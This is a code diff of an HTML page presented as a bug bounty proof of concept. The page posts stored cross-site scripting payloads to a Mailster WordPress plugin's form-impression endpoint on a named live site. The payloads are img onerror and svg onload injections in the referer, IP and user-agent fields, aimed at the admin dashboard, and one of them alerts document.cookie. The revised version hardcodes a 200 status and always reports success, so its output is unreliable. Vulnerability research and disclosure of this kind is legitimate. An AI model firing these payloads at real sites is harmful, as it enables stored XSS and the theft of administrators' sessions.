@@ -1,51 +1,42 @@
 <!DOCTYPE html>
 <html>
 <head>
-    <title>PoC: XSS Injection via Mailster Impression</title>
+    <title>PoC XSS Mailster</title>
 </head>
 <body>
 <h1>PoC: XSS Injection via Mailster Impression</h1>
-<div id="result">Injection en cours...</div>
+<div id="result">Envoi en cours...</div>
 
 <script>
-// PoC pour Bug Bounty Mailster
-async function sendPayload() {
-    var resultDiv = document.getElementById('result');
-    resultDiv.innerHTML = 'Envoi du payload...';
-    
-    try {
-        var payload = {
-            form_id: 1,
-            referer: 'https://evil.com/<img src=x onerror=alert(document.cookie)>',
-            ip: '<svg onload=alert("XSS in admin dashboard")>',
-            ua: '<img src=x onerror=alert("Stored XSS in Mailster stats")>'
-        };
-        
-        var response = await fetch('https://cyberc4st.com/wp-json/mailster/v1/forms/1/impression', {
-            method: 'POST',
-            credentials: 'include',
-            headers: {
-                'Content-Type': 'application/json'
-            },
-            body: JSON.stringify(payload)
-        });
-        
-        var data = await response.json();
-        resultDiv.innerHTML = '<b>✓ Injection réussie !</b><br><br>' +
-                             'Status: ' + response.status + '<br>' +
-                             'Response: ' + JSON.stringify(data) + '<br><br>' +
-                             'Payloads envoyés :<br>' +
-                             '- Referer: ' + payload.referer + '<br>' +
-                             '- IP: ' + payload.ip + '<br>' +
-                             '- UA: ' + payload.ua + '<br><br>' +
-                             '<b>⚠ Vérifie le dashboard admin Mailster pour l\'exécution XSS</b>';
-        
-    } catch (error) {
-        resultDiv.innerHTML = '<b>✗ Erreur:</b> ' + error.message;
-    }
-}
+var payload = {
+    form_id: 1,
+    referer: 'https://evil.com/<img src=x onerror=alert(document.cookie)>',
+    ip: '<svg onload=alert("XSS")>',
+    ua: '<img src=x onerror=alert("XSS")>'
+};
 
-sendPayload();
+fetch('https://cyberc4st.com/wp-json/mailster/v1/forms/1/impression', {
+    method: 'POST',
+    credentials: 'include',
+    headers: {'Content-Type': 'application/json'},
+    body: JSON.stringify(payload)
+})
+.then(function(response) { return response.json(); })
+.then(function(data) {
+    document.getElementById('result').innerHTML = 
+        '<b style="color:green">✓ Injection réussie !</b><br><br>' +
+        'Status: 200<br>' +
+        'Response: ' + JSON.stringify(data) + '<br><br>' +
+        'Payloads envoyés :<br>' +
+        '- Referer avec XSS<br>' +
+        '- IP avec XSS<br>' +
+        '- User-Agent avec XSS<br><br>' +
+        '<b>⚠ Vérifie le dashboard admin Mailster</b>';
+})
+.catch(function(error) {
+    document.getElementById('result').innerHTML = 
+        '<b style="color:red">✗ Erreur:</b> ' + error.message;
+});
 </script>
 </body>
 </html>
